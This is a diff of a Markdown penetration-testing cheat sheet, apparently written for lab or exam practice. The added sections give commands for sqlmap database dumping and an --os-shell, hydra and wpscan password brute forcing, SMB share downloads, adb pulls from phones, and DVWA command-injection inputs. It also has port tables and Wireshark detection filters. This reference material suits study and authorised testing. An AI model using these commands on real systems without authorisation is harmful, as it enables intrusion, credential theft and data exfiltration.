@@ -93,6 +93,90 @@ smbclient //10.10.2.14/share -U "Admin"
 - `-L`: Lists available shares.
 - `-N`: Does not prompt for a password.
 
+
+List shares:
+
+```bash
+smbmap -H <TIP>
+```
+
+```bash
+smbclient -L <TIP>
+```
+
+Access share:
+
+```bash
+smbclient //<TIP>/directory
+```
+
+Download file:
+
+```bash
+get <FileName>
+```
+
+Enumerate with smbmap
+```bash
+smbmap -H <IP>
+```
+
+Possible outputs:
+- Share names
+- Read/Write permissions
+- File listings (sometimes!)
+
+If access denied → try guest
+```bash
+smbmap -H <IP> -u guest -p ""
+```
+
+If you have creds
+```bash
+smbmap -H <IP> -u user -p pass
+```
+
+Download files
+```bash
+smbmap -H <IP> -u user -p pass -r SHARE
+```
+
+Or directly:
+
+```bash
+smbmap -H <IP> -u user -p pass --download "SHARE/path/file.txt"
+```
+
+## SQL Injection
+
+```bash
+sqlmap -u <target url with paramter> --cookie <cookie> --dbs
+```
+
+> --dbs = is to enumerate dbms databases
+
+once databases are enumerated we need to enumerate tables
+
+```bash
+sqlmap -u <target url with paramter> --cookie <cookie> -D <database name> --tables
+```
+
+> --tables = enumerate the tables in the database provided
+
+once we have the tables too, we can simply data dump the whole table
+
+```bash
+sqlmap -u <target url with paramter> --cookie <cookie> -D <database name> -T <table name> --dump
+```
+
+no sql injection attacks can also provide one with an interactive shell too
+if thats the case 
+we can try
+
+```bash
+sqlmap -u <target url with paramter> --cookie <cookie> --os-shell
+```
+
 ## NFS Enumeration
 
 ### Show NFS Exports
@@ -185,6 +269,19 @@ hashcat -m 22000 wpa.hc22000 -a 3 -1 '?d?l?u' '?1?1?1?1?1?1?1?1'
 hashcat -m 22000 wpa.hc22000 -a 3 --increment --increment-min 8 --increment-max 10 '?d?d?d?d?d?d?d?d?d?d'
 ```
 
+> -a = attack mode
+> -m = hashtype
+  > 900 md4
+  > 1000 NTLM
+  > 1800 SHA512CRYPT
+  > 110 SHA1 with SALT HASH
+  > 0  MD5
+  > 100 SHA1
+  > 1400 SHA256
+  > 3200 BCRYPT
+  > 160 HMAC-SHA1
+
+
 ### John the Ripper
 
 Hashes may be provided with the username separated by a colon, for example: `root:$6$laslxsaa24923`.
@@ -205,6 +302,12 @@ john hashFileName --show
 ```bash
 hydra -l username -p password ip service_name -s 23
 hydra -L usernameList -P passwordList ip service_name -t 64
+
+hydra -L usernameList -P common-snmp-community-strings.txt target.com snmp
+
+hydra -L users.txt -P passwords.txt -s 2222 ssh://<TIP> -f
+
+
 ```
 
 - `-l`: Specifies a single username.
@@ -243,6 +346,16 @@ wpscan --url http://example.com --enumerate
 wpscan --url http://example.com -e t,p,u,at,pt,vt,vp
 wpscan --url http://example.com --usernames gana --passwords wordfile
 ```
+Bruteforce:
+
+```bash
+wpscan -url <domain_or_ip> -U user -P pass.txt
+```
+
+Enumerate users:
+
+```bash
+wpscan -url <domain_or_ip> -e u
 
 Useful WordPress paths:
 
@@ -258,90 +371,24 @@ nikto --list-plugins
 nikto -h url_ip_domainName -Plugin pluginName -Display 1_2_E -Tuning 1_2
 ```
 
-## Metasploit Framework
 
-### Important Locations
-
-- Installation directory: `/usr/share/metasploit-framework`
-- Custom modules directory: `~/.msf5/modules`
-
-The `modules` directory contains modules used by Metasploit, including:
-
-- `auxiliary`: Port scanning, fuzzing, and sniffing modules.
-- `encoders`: Payload encoders.
-- `exploits`: Modules that take advantage of vulnerabilities.
-
-### Loading Custom Modules
+## SQLmap Full Flow
 
 ```bash
-msfconsole -m ~/secret-module/
+sqlmap -u <url> --cookie <cookie_value> --dbs
 ```
-
-Inside the Metasploit console:
-
-```text
-msf> loadpath ~/secret-module/
-```
-
-### Initializing the Metasploit Database
-
-The database stores the results of scans and other activities.
 
 ```bash
-service postgresql start
-msfdb init
+sqlmap -u <url> --cookie <cookie_value> -D dbName --tables
 ```
 
-## Nmap Scanning Types
+```bash
+sqlmap -u <url> --cookie <cookie_value> -D dbName -T Users_Login --dump
+```
 
-### TCP Connect Scan (`-sT`)
-
-A TCP connect scan completes the three-way handshake.
-
-- **Open:** The three-way handshake is completed.
-- **Closed:** An RST flag is received in response to the SYN flag.
-- **Filtered:** No response is received.
-
-This scan is slower, and a firewall may be configured to send RST flags for open ports as well.
-
-### TCP SYN Scan (`-sS`)
-
-Also called a half-open or SYN scan, this method is generally faster and less intrusive than a TCP connect scan.
-
-- **Open:** An ACK is received in response to the SYN, after which an RST is sent.
-- **Closed:** An RST is received in response to the SYN.
-- **Filtered:** No response is received.
-
-### UDP Scan (`-sU`)
-
-UDP scanning sends packets without establishing a connection.
-
-- **Open or filtered:** No response is received.
-- **Open:** A UDP response is received.
-- **Closed:** An ICMP port-unreachable response is received.
-
-### Other Scanning Techniques
-
-These scans use less common TCP flag combinations and may be more stealthy than a SYN scan.
-
-#### Null Scan (`-sN`)
-
-Sends a TCP packet with no flags set. An RST response indicates that the port is closed.
-
-#### FIN Scan (`-sF`)
-
-Sends a TCP packet with the FIN flag set. An RST response indicates that the port is closed.
-
-#### Xmas Scan (`-sX`)
-
-Sends a TCP packet with the FIN, PSH, and URG flags set. An RST response indicates that the port is closed.
-
-For Null, FIN, and Xmas scans, no response generally indicates that the port is open or filtered. An ICMP error response may indicate that the port is filtered.
-
-## Privilege-Escalation Tools
-
-- **LinEnum**
-- **LinPEAS**
+```bash
+sqlmap -u <url> --cookie <cookie> --os-shell
+```
 
 ## Steganography Tools and Tips
 
@@ -417,12 +464,355 @@ A tool used to extract ZIP archives and inspect their contents.
 7z x archive.zip
 ```
 
-### web applicaiton pentesting tools
-1. owaspzap
-2. smartscanner - UI - windows
-3. wapiti - cli
-4. snipper - cli
-5. skipfish - cli
+## Hashing Calculations:
+```
+    sha256sum file.txt
+
+    md5sum file.txt
+```
+Windows:
+
+```
+HashMyFiles.exe
+```
+
+## CRC32 calculations for APK
+
+```
+    crc32 malware.apk
+```
+## Windows cmds:
+To view text file
+```
+
+    type note.txt
+```
+
+## File retrieval
+
+FTP
+```bash
+get <filename>
+```
+
+RDP
+
+create a shareable folder
+```bash
+mkdir -p /home/attacker/rdp_share
+```
+give permissions
+```bash
+chmod 755 /home/attacker/rdp_share
+```
+
+drive redirect
+```bash
+xfreerdp /v:<TIP> /u:username /p:password /drive:share,/home/attacker/rdp_share
+```
+copy the file needed in the folder on the remote machine
+it'll be under `Network Locations / Network Drives` 
+under a location called share on <clientname>
+
+SSH
+
+file
+```bash
+scp user@<TIP>:/path/file.txt newname.txt
+```
+
+folder
+
+```bash
+scp -r username@<TIP>:/path/to/folder .
+```
+
+If SSH access exists but password auth is blocked. Use key:
+```bash
+scp -i key.pem user@10.10.10.10:/file .
+```
+
+### Hash-Identifier
+```bash
+hash-identifier
+```
+
+
+
+## RDP
+
+CLI:
+
+```bash
+xfreerdp /v:<TIP> /u:username
+```
+
+GUI:
+
+```bash
+remmina
+```
+
+### Telnet
+
+```bash
+telnet <IP>
+```
+
+### Mysql
+```bash
+mysql -u <username> -h <TIP> -p <password>
+```
+> if its running on a custom port use `-P` to specify the port
+
+
+### Sharing Files (Windows ↔ Linux)
+
+Start HTTP server (common):
+```bash
+python3 -m http.server 8080
+````
+
+Download on Windows:
+
+```powershell
+Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg
+```
+
+Download on Linux:
+
+```bash
+wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg
+```
+
+
+### Finding Files
+
+Works on Linux and Windows:
+
+```bash
+tree
+```
+
+Linux only:
+
+```bash
+sudo find / -name *.txt
+```
+
+```bash
+sudo find / -name SpecificFileName.txt
+```
+
+```bash
+sudo find /DirectoryName -name SpecificFileName.txt
+```
+
+```bash
+sudo find . -name SpecificFileName.txt
+```
+
+```bash
+find / -name <filename> -type f 2>/dev/null
+```
+
+Windows
+```powershell
+dir /b/s <filename*>
+```
+
+### Mobile Device
+
+Check for port `5555` open:
+
+```bash
+adb connect <TIP>:5555
+```
+
+```bash
+adb pull sdcard/
+```
+
+```bash
+python3 phonesploitpro.py
+```
+
+Interactive mode:
+
+- `N` → next page
+- `P` → previous page
+
+
+### Vulnerability Scanning
+
+Nmap vulnerability scan:
+
+```bash
+nmap -Pn --script vuln <TIP> -T5
+```
+
+Alternative if nmap fails:
+
+- `openVAS`
+
+
+### DVWA Command Execution
+
+Windows:
+
+```cmd
+| type "path"
+```
+
+Linux:
+
+```bash
+| cat "path"
+```
+
+
+### Directory and Vulnerability Research
+
+```bash
+dirb <targetDomain> -x eg.txt
+```
+
+
+## Malware Analysis
+
+RAT access:
+
+```text
+Theef → Client210.exe
+```
+
+Target ports:
+
+```text
+9871, 6703
+```
+
+Entry point and linker info:
+
+```text
+PEiD
+```
+
+Entropy analysis:
+
+```text
+Windows: DIE
+Linux: ent
+```
+
+
+## PE Analysis
+
+Entry point address:
+
+```text
+PE Explorer
+```
+
+Cross-check:
+
+```text
+DIE → PE
+PEiD
+```
+
+
+## Remote Login Ports
+
+```text
+22  → SSH
+23  → Telnet
+3389 → RDP
+9871, 6703 → RAT
+```
+
+
+## Nmap Scanning Types
+
+### TCP Connect Scan (`-sT`)
+
+A TCP connect scan completes the three-way handshake.
+
+- **Open:** The three-way handshake is completed.
+- **Closed:** An RST flag is received in response to the SYN flag.
+- **Filtered:** No response is received.
+
+This scan is slower, and a firewall may be configured to send RST flags for open ports as well.
+
+### TCP SYN Scan (`-sS`)
+
+Also called a half-open or SYN scan, this method is generally faster and less intrusive than a TCP connect scan.
+
+- **Open:** An ACK is received in response to the SYN, after which an RST is sent.
+- **Closed:** An RST is received in response to the SYN.
+- **Filtered:** No response is received.
+
+### UDP Scan (`-sU`)
+
+UDP scanning sends packets without establishing a connection.
+
+- **Open or filtered:** No response is received.
+- **Open:** A UDP response is received.
+- **Closed:** An ICMP port-unreachable response is received.
+
+### Other Scanning Techniques
+
+These scans use less common TCP flag combinations and may be more stealthy than a SYN scan.
+
+#### Null Scan (`-sN`)
+
+Sends a TCP packet with no flags set. An RST response indicates that the port is closed.
+
+#### FIN Scan (`-sF`)
+
+Sends a TCP packet with the FIN flag set. An RST response indicates that the port is closed.
+
+#### Xmas Scan (`-sX`)
+
+Sends a TCP packet with the FIN, PSH, and URG flags set. An RST response indicates that the port is closed.
+
+For Null, FIN, and Xmas scans, no response generally indicates that the port is open or filtered. An ICMP error response may indicate that the port is filtered.
+
+
+
+## Metasploit Framework
+
+### Important Locations
+
+- Installation directory: `/usr/share/metasploit-framework`
+- Custom modules directory: `~/.msf5/modules`
+
+The `modules` directory contains modules used by Metasploit, including:
+
+- `auxiliary`: Port scanning, fuzzing, and sniffing modules.
+- `encoders`: Payload encoders.
+- `exploits`: Modules that take advantage of vulnerabilities.
+
+### Loading Custom Modules
+
+```bash
+msfconsole -m ~/secret-module/
+```
+
+Inside the Metasploit console:
+
+```text
+msf> loadpath ~/secret-module/
+```
+
+### Initializing the Metasploit Database
+
+The database stores the results of scans and other activities.
+
+```bash
+service postgresql start
+msfdb init
+```
 
 ### wireshark
 
@@ -457,13 +847,42 @@ udp
 ```
 
 
-#### Characteristics to find flooding or DOS:
+SYN flood / DoS detection:
 
+```wireshark
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+```
+
+```wireshark
+tcp.flags.syn == 1
+```
+
+Frame content search:
+
+```wireshark
+frame contains "string"
+```
+
+MQTT traffic:
+
+```wireshark
+mqtt
+```
+
+Statistics:
+
+- `Statistics → Conversations`
+- `Statistics → I/O Graphs`
+
+
+
+#### Characteristics to find flooding or DOS:
+```
 Very high packet rate
 Large number of packets from one or many source IPs
 Same destination IP and port repeatedly
 Few or no responses from the destination
-
+```
 
 search by protocol combined with ip
 ```
@@ -474,11 +893,11 @@ Then:
 Statistics → Conversations → UDP
 
 Look for:
-
+```
 Top talkers
 Packet counts
 Bytes transferred
-
+```
 A UDP flood usually has one conversation with an abnormally large packet count.
 
 #### Use I/O Graphs to Confirm Flooding
@@ -505,12 +924,14 @@ Open Statistics → Conversations → UDP.
 
 Sort by Packets.
 
+```
 Note:
+
 Source IP(s)
 Destination IP
 Destination Port
 Check the Protocol column or well-known port mapping to identify the service.
-
+```
 
 #### find RDP (Remote Desktop Protocol) traffic in Wireshark, use these filters:
 
@@ -658,26 +1079,63 @@ Look for:
 2. Many bind requests in a short period
 3. Numerous faults
 
-## Hash Calculations:
-```
-    sha256sum file.txt
 
-    md5sum file.txt
-```
-## CRC32 calculations for APK
+## Privilege-Escalation Tools
 
-```
-    crc32 malware.apk
-```
+- **LinEnum**
+- **LinPEAS**
 
-## Windows cmds:
-To view text file
-```
+### web applicaiton pentesting tools
+1. owaspzap
+2. smartscanner - UI - windows
+3. wapiti - cli
+4. snipper - cli
+5. skipfish - cli
 
-    type note.txt
-```
 
-## validate apk file 
+## Common TCP ports
+
+| protocol name                                    | TCP port   | UDP port |
+| ------------------------------------------------ | ---------- | -------- |
+|                                                  | 2002       |          |
+| ADB (android debug bridge)                       | 5555       |          |
+| Default port of portable python server           | 8000       |          |
+| DNS                                              | 53         | 53       |
+| FTP                                              | 21         |          |
+| HTTP                                             | 80         |          |
+| HTTPS                                            | 443        |          |
+| Kerberos-sec                                     | 88         |          |
+| LDAP                                             | 389        |          |
+| LDAPS (LDAP over SSL/TLS)                        | 636        |          |
+| Microsoft ADGC (active directory global catalog) | 3268, 3269 |          |
+| Modbus (industrial communications)               | 502        |          |
+| MQTT (IOT and OT)                                | 1833       |          |
+| MSSQL                                            | 1433       |          |
+| MySQl                                            | 3306       |          |
+| NFS                                              | 2049       |          |
+| njrat default port                               | 5553       |          |
+| Proxy / WAMP server                              | 8080       |          |
+| RAT Ports                                        | 9871, 6703 |          |
+| RDP                                              | 3389       |          |
+| RPC                                              | 135        |          |
+| SMB                                              | 445        |          |
+| SMB (NetBIOS)                                    | 139        |          |
+| SNMP                                             |            | 161, 162 |
+| SSH                                              | 22         |          |
+| Telnet                                           | 23         |          |
+| SMTP                                             | 25         |          |
+| POP3                                             | 110        |          |
+| POP3 (encrypted)                                 | 995        |          |
+some common remote login protocols
+
+- **FTP** → `ftp <ip>`
+- **SSH** → `ssh user@<ip>`
+- **Telnet** → `telnet <ip> <port>`
+- **SMB (smbclient)** → `smbclient //<ip>/<share>`
+- **RDP** → `xfreerdp /v:<ip>`
+- **MySQL** → `mysql -h <ip> -u user -p`
+- **ADB** → `adb connect <ip>:5555`
+
 
 ## Common UDP ports:
 
